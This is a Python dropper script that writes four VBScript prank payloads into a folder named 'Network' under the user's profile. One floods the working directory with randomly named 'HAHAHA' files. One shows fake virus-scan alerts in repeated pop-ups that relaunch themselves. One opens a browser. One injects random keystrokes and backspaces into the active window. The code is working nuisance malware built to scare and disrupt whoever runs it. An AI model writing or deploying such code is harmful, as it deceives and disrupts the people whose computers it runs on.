import sys, time, os
def main():
	try:
		if sys.argv[1]=="w":

			#Used to create a single string
			name=sys.argv[2]
			rec=open("../VBScripts/"+name+".vbs", "r")
			test=open("test.txt", "w")
			oneLine=name+".write('"
			length=len(rec.read())
			rec.seek(0)

			counter=0
			for i in range(length):
				cur=rec.read(1)
				counter+=1
				if counter==200:
					print("ADDING NEWLINE!")
					counter=0
					oneLine+="')"
					oneLine+='\n'
					oneLine+=name+".write('"
				if cur=='\n':
					oneLine+='\\n'
				elif cur=="{":
					oneLine+="\{"
				elif cur=="}":
					oneLine+="\}"
				else:
					oneLine+=cur


			oneLine+="')"
			test.write(oneLine)

			rec.close()
			test.close()
	except:
		print("Creating Scripts...")
		env=os.getcwd()+"/"
		try:
			env=os.environ["USERPROFILE"]+"\\Network\\"
		except:
			pass
		#Creating directory
		if not os.path.exists(env):
			print("Creating {}...".format(env))
			os.mkdir(env)
		else:
			print("Directory '{}' already exists!".format(env))

		#Actually writing the vbscripts
		spam=open(env+"spam.vbs", "w")
		message=open(env+"message.vbs", "w")
		internet=open(env+"internet.vbs", "w")
		typer=open(env+"typer.vbs", "w")

		spam.write('Set fso=CreateObject("Scripting.FileSystemObject")\nthisScript=WScript.ScriptFullName\nDim randWord, min, max, charSet\ncharSet="abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&-_"\nmin=1\nmax=61\nrandWord=""\n\n')
		spam.write('\nFor i=1 to 40\n	randWord=""\n	For y=1 to 15\n	Randomize\n	randWord=randWord+Mid(charSet, Int(max-min+1)*Rnd+min, 1)\n	Next\n\n	Set textFile=fso.CreateTextFile(""&randWord&".txt")\n	Call textFile.Write("HAHAH')
		spam.write('A")\n	textFile.Close\nNext\n')

		message.write('Set fso=CreateObject("Scripting.FileSystemObject")\nSet oSh=CreateObject("WScript.Shell")\n\nSet test=fso.CreateTextFile("msg.vbs")\n\ntest.Write "x=msgbox(""Our scan results:""&vbCrLf&""You have a virus!')
		message.write('"", 274, ""Uh Oh!"")"\n\ntest.Write ""&vbCrLf&"If x=4 Then"&vbCrLf&"  CreateObject(""WScript.Shell"").Run(""message.vbs"")"\ntest.Write ""&vbCrLf&"ElseIf x=5 Then"&vbCrLf\ntest.Write ""&vbCrLf&"  msg=msgb')
		message.write('ox(""Ignoring this issue can cause issues!"", 64, ""Attention!"")"\ntest.Write vbCrLf&"ElseIf x=3 Then"&vbCrLf&"  msg=msgbox(""Abortion is a sin!"", 48, ""Attention!"")"\ntest.Write ""&vbCrLf&"End If"\nt')
		message.write('est.Close\n\nFor i=1 to 20\n	oSh.Run "msg.vbs"\nNext\n\nWScript.Sleep(500)\nfso.DeleteFile("msg.vbs")\n')

		internet.write('Set sh=CreateObject("WScript.Shell")\nsh.run "https://www.google.com/"\n')

		typer.write('Set sh=CreateObject("WScript.Shell")\ncharSet="abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*-=_+;:,.?XXXXXXX"\nmin=1\ncharMax=60\nmiT=2\nmT=6\n\nRandomize\nFor i=1 to Int((charMax-min+1)*Rnd+min)\n	Randomize\n	')
		typer.write('randLetter=Mid(charSet, Int((charMax-min+1)*Rnd+min), 1)\n	Randomize\n	randTime=Int(((mT-miT+1)*Rnd+miT)*1000)\n	WScript.Sleep(randTime)\n	If randLetter="X" Then\n		sh.SendKeys("\{BS\}")\n	Else\n		sh.SendKeys(')
		typer.write('randLetter)\n	End If\nNext\n')

		#Setting permissions and closing files
		spam.close()
		message.close()
		internet.close()
		typer.close()

		print("Done!")
		time.sleep(5)


if __name__=="__main__":
	main()
